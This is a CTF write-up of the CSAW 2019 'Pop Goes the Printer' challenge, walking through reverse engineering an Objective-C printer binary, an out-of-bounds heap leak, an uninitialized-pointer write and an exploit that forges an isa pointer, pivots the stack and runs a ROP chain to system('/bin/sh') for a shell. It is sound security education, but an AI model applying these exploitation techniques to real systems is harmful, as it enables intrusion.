---
title: CSAW CTF Qualification - Pop Goes the Printer
authors: Stefan Blair (fzzyhd)
date: 2019-09-15
categories: binary-exploitation
---

Pop Goes the Printer was a 500 point pwn [challenge](https://github.com/osirislab/CSAW-CTF-2019-Quals/tree/master/pwn/pop_goes_the_printer) from CSAW CTF Quals 2019.  It was a fairly large binary framed as real printer software.  The bugs felt accidental, and much of the code was irrelevant to the exploitation process, making it feel a lot more like a real-world target than a pwnable.  RPISEC was the only solve for this challenge.

Provided was a binary called pgtp, a bunch of libraries and a Dockerfile.  The binary was, from the challenge description, “totally not based on printer software that a lot of universities use that is buggy af”.  To replicate the remote environment as much as possible, we were intended to run the challenge in a Docker container.
I put more information on my setup at the end of the post.

# Reverse Engineering
After opening up the binary in IDA, I quickly noticed that the binary contains Objective-C code.
Time for an Objective-C Primer!

## An Objective-C Primer
This is a brief introduction with information relevant to the challenge.  For further reading, I recommend [this](http://phrack.org/issues/66/4.html) article.

In Objective-C, objects have an `isa` pointer as the first member of their struct.  It points to class data, which includes a mapping of selectors (`SEL`s) to their corresponding method pointers.  To look up a method, you call the `objc_msg_lookup` function, which accepts an object or class, and a `SEL`.  In practice, a `SEL` is usually a `char*`, as in this case.  So, whenever you see `objc_msg_lookup`, its just a method call, and the second argument is the method name.

This setup uses gnustep, Linux's Objective-C implementation, which differs somewhat from MacOS.  For example, in gnustep, calls to the function `objc_get_class` take in a `char*` class name, and return a pointer to that class.  On MacOS, classes are lazily resolved external symbols, so you don't need to call `objc_get_class`.

A final note about syntax in Objective-C, if you see 
```objc
[someObject someMethodName: arg]
```
this is like writing 
```c
someObject.someMethodName(arg)
```
in other languages.  I'll be writing some Objective-C pseudo-code.

## Binary Overview
There are quite a few functions and objects to keep track of in the program.  I've created this diagram that shows the simplified object hierarchy next to a simplified function call graph.  They are aligned such that each object is next to the function that allocates it.  The rest of the section goes into detail about these elements.
```
  ################                               ###################
  # Object Graph #                               #  Function Graph #
  ################                               ###################

                                                     +------+
+-----------------+                                  | main |
| PGPPrintManager |                                  +---+--+
| - - - - - - - - |                                      |
|  _jobSecurity   |                       +--------------+---------------+
|  _printJobs[] --------+                 | [PGPPrintManager getNextJob] |
+-----------------+     |                 +--------------+---------------+
                        |                                |
                        |                                |
  +-------------+       |                                |
  | PGPPrintJob + <-----+                                V
  | - - - - - - |                        +---------------+------------------+
  |   _objs[] ----------+                | [PGPrintJob parseNetworkPacket:] |
  +-------------+       |                +---------------+------------------+
  | PGPPrintJob |       |                                |
  | - - - - - - |       |                                |
  +-------------+       |                                |
  |     ...     |       |                                |
  +-------------+       |                                |
                        |                                |
                        |                                V
   +-----------+        |               +----------------+-------------------+
   | PGPObject + <------+               | [PGPObjectV2 parseObjectFromData:] |
   +-----------+                        +----------------+-------------------+
   |    ...    |                                         |
   +-----------+                                         |
                                                         |
                                                         |
             global                                      V
+---------------------------------+            +----------------+
| pgp_object_config object_config |            | setup_config() |
+---------------------------------+            +----------------+
```

The [`main`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/master/pwn/pop_goes_the_printer/src/main.m) function is fairly simple, the important part is
```objc
PGPPrintManager* manager = [[PGPPrintManager alloc] init];
[manager sendGreetz];
while (1)
{
    [manager getNextJob];
}
```

The [`-[PGPPrintManager getNextJob]`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPPrintManager.m#L28-L68) method reads in data from the user, allocates a new [`PGPPrintJob`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPPrintJob.m) object, and parses it from the user data with the method [`-[PGPPrintJob parseNetworkPacket:NSData*]`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPPrintJob.m#L54-L121).  If the user input was valid, it does some further checks and commands.

The [`-[PGPPrintJob parseNetworkPacket:NSData*]`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPPrintJob.m#L54-L121) method parses the user data, doing checks to ensure that it is in a correct format.
The format it expects to parse is
```
+-------------------------+-------+
|           Value         | bytes |
+-------------------------+-------+
| “PGPB” constant string  |   4   |
+-------------------------+-------+
| Version number (1 or 2) |   2   |
+-------------------------+-------+
|    Challenge solution   |   8   |
+-------------------------+-------+
|      Command bits       |   1   |
+-------------------------+-------+
|    Number of objects    |   2   |
+-------------------------+-------+
|     Array of objects    |  N.A  |
+-------------------------+-------+
```
It reads these values in, and sets the corresponding members of the [`PGPPrintJob`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPPrintJob.m).  Next, it reads in the specified number of objects.  The version number controls whether the objects are version 1 or version 2 (different subclasses), and spoiler alert, I didn’t use version 1 for anything.

Something to note, these parsing methods make heavy use of a class called [`CCHBinaryDataReader`](https://github.com/choefele/CCHBinaryData/blob/master/CCHBinaryData/CCHBinaryDataReader.m), which comes from a [custom library](https://github.com/choefele/CCHBinaryData).  The [`CCHBinaryDataReader`](https://github.com/choefele/CCHBinaryData/blob/master/CCHBinaryData/CCHBinaryDataReader.m) object wraps the user data, providing an easy interface to it.  The first lines of [`-[PGPPrintJob parseNetworkPacket:NSData*]`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPPrintJob.m#L55-L56) use the option [`CCHBinaryDataReaderBigEndian`](https://github.com/choefele/CCHBinaryData/blob/47a305605b3f9eab7c1a452c9361eb3f569ab347/CCHBinaryData/CCHBinaryDataReader.h#L32).  Our data is parsed as big-endian, which is something to keep in mind when sending in data.

## First Bug
The version 2 objects are parsed using the [`-[PGPObjectV2 parseObjectFromData:CCHBinaryDataReader*]`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPObjectV2.m#L11-L66) method.  Here is the pseudocode I gathered from the disassembly:
```objc
- (NSInteger) parseObjectFromData:(CCHBinaryDataReader*) binaryReader {
    pgp_object_config config = [PGPObject object_config];
    bool valid_config = is_valid_config(config);
    uint8_t should_setup_config = [binaryReader readUnsignedChar];
    self->_type = [binaryReader readUnsignedChar];
    switch(self->_type)
    {
        case 1:
        case 2:
            self->data = [binaryReader readDataWithNumberOfBytes: 2];
            goto SETUP_CONFIG;
            ...
        case 9:
            uint8_t color = [binaryReader readUnsignedChar];
            if (valid_config && config.type == 2)
            {
                // no bounds check on user-supplied value!
                color_bytes = config.vals[color];
                self->data = [NSMutableData dataWithBytes: &color_bytes length: 5];
            }
    SETUP_CONFIG:
            switch(should_setup_config)
            {
                case 1:
                    ...
                case 3:
                    setup_config(binaryReader, 0);
                    break;
            } 
        ...
    }
    ...
}
```
I've hidden the unimportant parts of the code.  The `switch` statement on `self->_type` has a bunch of cases, but we only care about `case 9`, or [`case PGPCOLOR`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPObjectV2.m#L48-L56).  It reads in a byte `color` from the user data, and then uses it to directly index into an array, copying 5 bytes of that to its `data`!  We can get the program to print this data, so this could provide us a leak. 

First lets figure out what this `config` object is.  At the top of the function, its set with a call to [`+[PGPObject object_config]`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPObject.m#L24), which just returns a global [`pgp_object_config`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPObject.m#L6-L10) called `object_config`.

How do we control `object_config`?  If you will, direct your attention to the second `switch` statement.  Depending on the value we put for `should_setup_config`, it calls the [`setup_config(CCHBinaryDataReader*)`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPObject.m#L26-L77) function.  I just put 3, because it was the simplest case.  Lets take a look at [`setup_config(CCHBinaryDataReader*)`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPObject.m#L26-L77).  Here is the pseudocode I gathered from the disassembly:
```objc
int setup_config(CCHBinaryDataReader* binaryReader) {
    uint64_t* new_config;
    uint64_t group_size = 0;
    to_copy = [binaryReader readUnsignedChar];
    if (to_copy > 8)
    {
        return -1;
    }
    // Here, we can control the type
    object_config.type = [binaryReader readUnsignedChar];
    if (object_config.type > 5)
    {
        return -1;
    }
    switch (object_config.type)
    {
        case 1:
            group_size = 1;
            new_config = calloc(to_copy + 1, 8);
            break;
        case 2:
            group_size = 5;
            new_config = calloc(to_copy + 1, 8);
            memset(new_config, -1, 8);
            break;
        case 3:
            group_size = 4;
            new_config = calloc(to_copy + 1, 8);
            break;
        // What about object_config.type == (4 or 5)?!
        default:
            group_size = 8;
    }
    if (!object_config.type)
    {
        return -1;
    }

    NSMutableData* data = [binaryReader readDataWithNumberOfBytes: to_copy * group_size];
    for (int i = 0; i < to_copy; i++)
    {
        // new_config is an array of uint64_t, and the max group size is 8.
        NSRange range = NSMakeRange(group_size * i, group_size);
        [data getBytes: (new_config + i) range: range];
    }
    object_config.count = count;
    free(object_config.vals);
    // Here, object_config.vals is set to a heap pointer!
    object_config.vals = new_config;

    return 0;
}
```
It reads in a `to_copy` value and the global `object_config`’s new type.  Based on that type, it initializes `group_size` and sets `new_config` to some `calloc`d data.  Then, it effectively reads data from the user into `new_config`, and sets `config.vals` to `new_config`.  So `config.vals` is a heap pointer, and we can use that out-of-bounds read to leak information from the heap!  All we have to do is setup `object_config` to have type 2.

# Second Bug
I have some good news.  The next bug is right in front of us.  Lets take another look at [`setup_config(CCHBinaryDataReader*)`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPObject.m#L26-L77).  We know `object_config.type` must be between 1 and 5, but the switch statement has no cases for 4 and 5!  Those values fall to `default`, and `new_config` never gets initialized to anything.  Whatever is already on the stack previously is the address that will be written to.

# Leak
As we saw, to get a leak, we need to send in a [`PGPPrintJob`](https://github.com/osirislab/CSAW-CTF-2019-Quals/blob/e66c6a21e9ea7425010c5dfcb2fb4352ada5c0b1/pwn/pop_goes_the_printer/src/PGPPrintJob.m) with version 2 objects.   We need one object of any type to trigger `setup_config()` so the `object_config.type == 2` and `object_config.vals` is a heap pointer.  We need another object with type `9` to trigger the out-of-bounds read of the heap data after `object_config.vals`.

Using my first object, I sent in `"FFFFFFFFFFFFFFFFFFFF"` to fill the new `object_config.vals` buffer.  I used GDB to examine memory around the `object_config.vals` buffer for good leak locations.

```
gdb-peda$ x/20xg $rax
0xfc5060:	0x0000004646464646	0x0000004646464646
0xfc5070:	0x0000004646464646	0x0000004646464646
0xfc5080:	0x0000000000000000	0x0000000000000051
0xfc5090:	0x0000000000000000	0x0000000000000000
0xfc50a0:	0x00007f454f75c000	0x0000000000000014
0xfc50b0:	0x0000000000f25460	0x0000000000000000
0xfc50c0:	0x00007f454f7f9700	0x0000000000000014
0xfc50d0:	0x000000000000000a	0x0000000000000071
0xfc50e0:	0x0000000000000000	0x0000000000000000
0xfc50f0:	0x00000000deadface	0x0000000000000000
```

I set `to_copy` to `4`, and `object_config.type` `case 2` initializes `group_size` to `5`, which explains the 4 `QWORD`s with their lower 5 bytes set to `0x46` (`"F"`).  The 8th `QWORD` from the beginning of the buffer (address `0xfc50a0`) contains an address from `libgnustep-base`.
```
gdb-peda$ vmmap 0x00007f454f75c000
Start              End                Perm	Name
0x00007f454f719000 0x00007f454f82b000 rw-p	/home/pgtp/libs/libgnustep-base.so.1.25
```
After running the program a few times, the offset from this address to the beginning of libc never changes, so we can use this address to determine the address of libc.
```
gdb-peda$ vmmap libc
Start              End                Perm	Name
0x00007f454e329000 0x00007f454e4ca000 r-xp	/home/pgtp/libs/libc.so.6
0x00007f454e4ca000 0x00007f454e6ca000 ---p	/home/pgtp/libs/libc.so.6
0x00007f454e6ca000 0x00007f454e6ce000 r--p	/home/pgtp/libs/libc.so.6
0x00007f454e6ce000 0x00007f454e6d0000 rw-p	/home/pgtp/libs/libc.so.6
gdb-peda$ dist 0x00007f454e329000 0x00007f454f719000
From 0x7f454e329000 to 0x7f454f719000: 20905984 bytes, 5226496 dwords
```
Using a `color` index of `8` for my second object successfully leaked that address.  It only leaks the first 5 bytes, however the upper 3 bytes of libraries are usually `0x00007f`, so we can assemble the full address ourselves.  We can use this same technique to get a heap leak.

Its worth mentioning that my leak did not initially show the same address when running on the remote instance.  When I did a heap scan (leaking various offsets from `object_config.vals`), the heap layout looked fairly different.  My hunch was that, with all the objects getting freed / reallocated, different chunks in different spots were getting reused.
To fix the problem, I allocated a bunch of objects before attempting to get a leak.  I verified that this worked by doing another heap scan, and comparing the results:
```bash
fzzyhd@fzzyhd: heap-scan.py             fzzyhd@fzzyhd: heap-scan.py remote
[*] heap @ 3 = 0x4242424242             [*] heap @ 3 = 0x4242424242
[*] heap @ 4 = 0x0                      [*] heap @ 4 = 0x0
[*] heap @ 5 = 0x51                     [*] heap @ 5 = 0x51
[*] heap @ 6 = 0x0                      [*] heap @ 6 = 0x0
[*] heap @ 7 = 0x0                      [*] heap @ 7 = 0x0
[*] heap @ 8 = 0xe7bbeb5000             [*] heap @ 8 = 0x67b44a000
[*] heap @ 9 = 0x14                     [*] heap @ 9 = 0x14
[*] heap @ 10 = 0x16f1460               [*] heap @ 10 = 0x2138480
[*] heap @ 11 = 0x0                     [*] heap @ 11 = 0x0
[*] heap @ 12 = 0x7ad5f58700            [*] heap @ 12 = 0xa346757700
[*] heap @ 13 = 0x14                    [*] heap @ 13 = 0x14
[*] heap @ 14 = 0xa                     [*] heap @ 14 = 0xa
```

Even though the addresses are different, the overall positioning / layout seems identical.

# Exploit
To trigger the uninitialized memory bug, we send in an object that sets `object_config.type` to `4` or `5`.  Note that the `group_size` then defaults to `8`.  I set `to_copy` to `8`, so I could write `64*"A"`s to whatever pointer happened to be on the stack, overwriting as much data as possible and increasing the chances of a crash.  After sending in that object, the program didn't immediately crash, but after sending in another object:
```
[----------------------------------registers-----------------------------------]
RAX: 0x400000065
RBX: 0x10d6a80 ('A' <repeats 64 times>)
RCX: 0x10c6ac0 --> 0x1009ea0 --> 0x0
RDX: 0x404b7a (<+[PGPObjectV2 apiVersion]>:	push   rbp)
RSI: 0x60ad20 --> 0x400000065
RDI: 0x10d6a80 ('A' <repeats 64 times>)
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7ffc53d19810 --> 0x8
RIP: 0x7ff56a863bf9 (<objc_msg_lookup+25>:	mov    rdx,QWORD PTR [rbp+0x40])
R8 : 0xb ('\x0b')
R9 : 0x1009160 --> 0x0
R10: 0x60a8f1 ("PGPObjectV2")
R11: 0x246
R12: 0x7ff56b1a9080 --> 0x7ff56b1a8e00 --> 0x7ff56aa6df80 (0x00007ff56aa6df80)
R13: 0x40156b (<-[CCHBinaryDataReader initWithData:options:]>:	push   rbp)
R14: 0x0
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x7ff56a863bef <objc_msg_lookup+15>:	sub    rsp,0x8
   0x7ff56a863bf3 <objc_msg_lookup+19>:	mov    rbp,QWORD PTR [rdi]
   0x7ff56a863bf6 <objc_msg_lookup+22>:	mov    rax,QWORD PTR [rsi]
=> 0x7ff56a863bf9 <objc_msg_lookup+25>:	mov    rdx,QWORD PTR [rbp+0x40]
   0x7ff56a863bfd <objc_msg_lookup+29>:	mov    ecx,eax
   0x7ff56a863bff <objc_msg_lookup+31>:	mov    r8,rax
   0x7ff56a863c02 <objc_msg_lookup+34>:	shl    ecx,0x5
   0x7ff56a863c05 <objc_msg_lookup+37>:	shr    r8,0x20
[------------------------------------stack-------------------------------------]
0000| 0x7ffc53d19810 --> 0x8
0008| 0x7ffc53d19818 --> 0x10d6a80 ('A' <repeats 64 times>)
0016| 0x7ffc53d19820 --> 0x7ffc53d198c0 --> 0x7ffc53d19940 --> 0x7ffc53d19990 --> 0x7ffc53d199d0 --> 0x0
0024| 0x7ffc53d19828 --> 0x7ff56b1a9080 --> 0x7ff56b1a8e00 --> 0x7ff56aa6df80 (0x00007ff56aa6df80)
0032| 0x7ffc53d19830 --> 0x40156b (<-[CCHBinaryDataReader initWithData:options:]>:	push   rbp)
0040| 0x7ffc53d19838 --> 0x0
0048| 0x7ffc53d19840 --> 0x0
0056| 0x7ffc53d19848 --> 0x404c2f (<-[PGPObjectV2 parseObjectFromData:]+162>:	)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGBUS
0x00007ff56a863bf9 in objc_msg_lookup () from /home/pgtp/libs/libobjc.so.4
gdb-peda$
```
We have control over `RBP`, which is a bit strange, but I’m not complaining.  The function we are crashing in is `objc_msg_lookup`, which is used to lookup object methods.  Here is the disassembly of the beginning of this function:
```asm
.text:000000000000FBE0                 test    rdi, rdi
.text:000000000000FBE3                 jz      short loc_FC40
.text:000000000000FBE5                 push    r15
.text:000000000000FBE7                 push    r14
.text:000000000000FBE9                 push    r13
.text:000000000000FBEB                 push    r12
.text:000000000000FBED                 push    rbp
.text:000000000000FBEE                 push    rbx
.text:000000000000FBEF                 sub     rsp, 8
.text:000000000000FBF3                 mov     rbp, [rdi]
.text:000000000000FBF6                 mov     rax, [rsi]
.text:000000000000FBF9                 mov     rdx, [rbp+40h]
.text:000000000000FBFD                 mov     ecx, eax
```

This function doesn't use `RBP` as a base pointer, but as a general purpose register.  The first argument to this function (`RDI`) is the object on which to do the method lookup.  `RDI` is dereferenced to load the object’s `isa` pointer into `RBP`.  It looks like we are overwriting some object’s `isa` pointer with `"A"`s, and the program only crashes later on, when that object is used again.

So we control an object’s `isa` pointer in the function that finds and returns a specified object method.  That sounds like an awfully good setup.  Here is some pseudocode for the function:
```objc
void* objc_msg_lookup(uint64_t* object, char* selector)
{
    uint64_t* isa_we_control = *object;
    uint64_t* object_we_control = *(isa_we_control + 64);
    uint64_t something = (*selector >> 32) + 32 * *selector;
                    // we want this to be small
    if (something < *(object_we_control + 40))
    {
        ...
    }
    else
    {
        // goal
        return **(object_we_control + 8);
    }
    ...
}
```
Looks like if we allocate and setup objects correctly, we can return an arbitrary function pointer.  Based on this code, we want an overall structure that looks something like this:
```
            object
    +--------------------+
    | 0x4141414141414141 |
    +----------+---------+
               |
               |
               V                         object_we_control
        isa_we_control                +--------------------+
    +----------+---------+   +--> +00 |                    |
+00 |   doesn't matter   |   |        +--------------------+     +--------------------+
    +--------------------+   |    +08 | 0x4343434343434343 + --> |                    |
+08 |         ...        |   |        +--------------------+     +----------+---------+
    +--------------------+   |    +16 |                    |                |
+16 |         ...        |   |        +--------------------+                V
    +--------------------+   |    +24 |                    |      some function pointer
... |         ...        |   |        +--------------------+     +--------------------+
    +--------------------+   |    +32 |                    |     | 0x4444444444444444 |
+64 | 0x4242424242424242 + --+        +--------------------+     +--------------------+
    +--------------------+        +40 |    small number    |
                                      +--------------------+
```
(Note, in this diagram, I’ve used 0x4141414141414141, etc. as stand-ins for real pointers)

We know how to make raw `calloc`ations in the `setup_config` function, which is what I decided to use for this.  There are a couple of other spots where our data is placed on the heap, and those are likely useable as well. 
The `small number` just has to be small enough that we fail the first `if` check, and fall to the `else` code (`// goal`).

Once we have this object setup, `objc_msg_lookup` should be returning the function pointer we specified (`0x4444444444444444` in the diagram).  Lets take a look at what happens when we, literally, just set it to `0x4444444444444444`.
```
[----------------------------------registers-----------------------------------]
RAX: 0x4444444444444444 ('DDDDDDDD')
RBX: 0x11eba80 --> 0x11eaa60 --> 0x7fecae3f0700 --> 0x7fecadf701d8 (<default_malloc>:	push   rbp)
RCX: 0xca4
RDX: 0x11eaad0 ("AAAAAAAA\300\346\036\001")
RSI: 0x60ad20 --> 0x400000065
RDI: 0x11eba80 --> 0x11eaa60 --> 0x7fecae3f0700 --> 0x7fecadf701d8 (<default_malloc>:	push   rbp)
RBP: 0x7ffc73cb59d0 --> 0x7ffc73cb5a50 --> 0x7ffc73cb5aa0 --> 0x7ffc73cb5ae0 --> 0x0
RSP: 0x7ffc73cb5960 --> 0x40156b (<-[CCHBinaryDataReader initWithData:options:]>:	push   rbp)
RIP: 0x404c39 (<-[PGPObjectV2 parseObjectFromData:]+172>:	call   rax)
R8 : 0x4
R9 : 0x111e160 --> 0x0
R10: 0x60a8f1 ("PGPObjectV2")
R11: 0x246
R12: 0x7fecae354080 --> 0x7fecae353e00 --> 0x7fecadc18f80 (0x00007fecadc18f80)
R13: 0x40156b (<-[CCHBinaryDataReader initWithData:options:]>:	push   rbp)
R14: 0x0
R15: 0x0
EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x404c2a <-[PGPObjectV2 parseObjectFromData:]+157>:
    call   0x401340 <objc_msg_lookup@plt>
   0x404c2f <-[PGPObjectV2 parseObjectFromData:]+162>:
    lea    rsi,[rip+0x2060ea]        # 0x60ad20 <_OBJC_SELECTOR_TABLE+32>
   0x404c36 <-[PGPObjectV2 parseObjectFromData:]+169>:	mov    rdi,rbx
=> 0x404c39 <-[PGPObjectV2 parseObjectFromData:]+172>:	call   rax
   0x404c3b <-[PGPObjectV2 parseObjectFromData:]+174>:	movzx  edx,al
   0x404c3e <-[PGPObjectV2 parseObjectFromData:]+177>:	mov    rax,QWORD PTR [rbp-0x58]
   0x404c42 <-[PGPObjectV2 parseObjectFromData:]+181>:	mov    QWORD PTR [rax+0x10],rdx
   0x404c46 <-[PGPObjectV2 parseObjectFromData:]+185>:	mov    rbx,QWORD PTR [rbp-0x68]
Guessed arguments:
arg[0]: 0x11eba80 --> 0x11eaa60 --> 0x7fecae3f0700 --> 0x7fecadf701d8 (<default_malloc>:	push   rbp)
arg[1]: 0x60ad20 --> 0x400000065
arg[2]: 0x11eaad0 ("AAAAAAAA\300\346\036\001")
[------------------------------------stack-------------------------------------]
0000| 0x7ffc73cb5960 --> 0x40156b (<-[CCHBinaryDataReader initWithData:options:]>:	push   rbp)
0008| 0x7ffc73cb5968 --> 0x11eba80 --> 0x11eaa60 --> 0x7fecae3f0700 --> 0x7fecadf701d8 (<default_malloc>:	push   rbp)
0016| 0x7ffc73cb5970 --> 0x609310 --> 0xd00000065 ('e')
0024| 0x7ffc73cb5978 --> 0x11edf10 --> 0x608780 --> 0x608600 --> 0x7fecadc18f80 (0x00007fecadc18f80)
0032| 0x7ffc73cb5980 --> 0x11edf10 --> 0x608780 --> 0x608600 --> 0x7fecadc18f80 (0x00007fecadc18f80)
0040| 0x7ffc73cb5988 --> 0x7ffc73cb59d0 --> 0x7ffc73cb5a50 --> 0x7ffc73cb5aa0 --> 0x7ffc73cb5ae0 --> 0x0
0048| 0x7ffc73cb5990 --> 0x804
0056| 0x7ffc73cb5998 --> 0x11eba80 --> 0x11eaa60 --> 0x7fecae3f0700 --> 0x7fecadf701d8 (<default_malloc>:	push   rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
```
So, as we could anticipate, its trying to call the returned function, which we’ve set to `0x4444444444444444`.  Additionally, it appears that `RDX` points to some data we control (hence the `AAAAA....`).  In fact, the chunk labeled (`object_we_control`) in the diagram is what `RDX` points too.

I was able to get `one_gadget` to work locally, but not remotely.  However, when I sent in a simple `ret` gadget, the program did not crash remotely, which verified to me that our leaks and everything were working as intended.  
Eventually, I decided to pivot the stack to `RDX` and ROP from there.  I ended up finding the following gadget:
```
0x000000000018dbd1 : push rdx ; cmc ; jmp qword ptr [rdx]
```
Using this gadget, we can push `RDX` onto the stack, and then jump to the address pointed to by `RDX`.  Right now, thats `0x4141414141414141`, but we can set that to another gadget.  We have pushed the address of `RDX` on the stack, so we want to pop that into `RSP`.  Once we’ve pushed `RDX` and popped it into `RSP`, the address in `RDX` becomes our new stack.  The first two `QWORD`s at `RDX` are the gadget we just called, and a heap pointer (refer to the diagram below for reference).  So we also want to pop those two off our new stack, and then we can ROP.  I chose to use this gadget.
```
0x0000000000024121 : pop rsp ; pop r13 ; pop r14 ; ret
```
And here is a modified memory diagram from above.
```
            object_we_control (RDX)
         +-----------------------------------+
+--> +00 | pop rsp ; pop r13 ; pop r14 ; ret |
|        +-----------------------------------+     +--------------------------------------+
|    +08 |         0x4343434343434343        + --> |                                      |
|        +-----------------------------------+     +-------------------+------------------+
|    +16 |           pop rdi ; ret           |                         |
|        +-----------------------------------+                         V
|    +24 |             "/bin/sh"             |               some function pointer
|        +-----------------------------------+     +--------------------------------------+
|    +32 |              system()             |     | push rdx ; cmc ; jmp qword ptr [rdx] |
+        +-----------------------------------+     +--------------------------------------+
     +40 |         some small number         |
         +-----------------------------------+
```
Running the final exploit:
```bash
fzzyhd@fzzyhd:> python exploit.py remote
[+] Opening connection to pwn.chal.csaw.io on port 1000: Done
[*] Challenge == 7749363893351949254 == 7749363893351949254
[*] libc @ 0x7fecacf20000
[*] heap address @ 0x11ee6c0
[*] Switching to interactive mode
bro$ cat flag.txt
flag{1_0bjective_s3e_wh4t_y0u_d1d_ther3}
$ ls
flag.txt
libs
pgtp
```
And there we have it, a piping hot flag!

# Conclusion
This challenge was a lot of fun to complete, especially because it felt very real-world.  I had a lot of fun piecing together information about the binary in the reverse engineering process.  The bugs were also very interesting and required a lot of interaction to get the program to a useful state.  The small differences between my local setup and the remote setup (for example, the differences in heap-layout) were an interesting challenge to overcome.

## Setup
For those unfamiliar with Docker, the setup process is fairly straightforward.  You just navigate to your folder with the provided files, and run
```bash
docker build -t pgtp .
```
Next, you can run the container using
```bash
docker run -it -p28201:28201 --name=pgtp pgtp
```
The `-p` flag just forwards `localhost:PORTNO` to your running Docker container.
You may also need to create a dummy `flag.txt`, as the Dockerfile expects one.
By default, the Dockerfile runs the same configuration as the remote server.  I made a few changes.  The last line of the Dockerfile contains the command that spawns a new pgtp process for each incoming connection:
```bash
CMD su pgtp -c "socat -T10 TCP-LISTEN:28201,reuseaddr,fork EXEC:/home/pgtp/pgtp"
```
The flag `-T10` sets a timeout of 10 seconds.  I deleted this for local development, so I could experiment freely by hand.

Next, I installed GDB, along with the peda plugin, directly in the container:
```bash
RUN apt-get install -y gdb 
RUN apt-get install -y git
RUN git clone https://github.com/longld/peda.git ~/peda
RUN echo "source ~/peda/peda.py" >> ~/.gdbinit
```
Then, after starting my container, in a separate pane, I connected to the container again using
```bash
docker exec -it pgtp bash
```
Finally, to allow GDB inside the container to attach to processes, I added the following flags to `docker run`:
```bash
docker run -it -p28201:28201 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined --name=pgtp pgtp
```
My exploit script would connect to localhost:28201, and then tell the gdb pane to attach to the running process.  I personally use [Tmux](https://github.com/tmux/tmux), and the [libtmux](https://github.com/tmux-python/libtmux) python library, to automate a lot of this stuff, but to each their own.
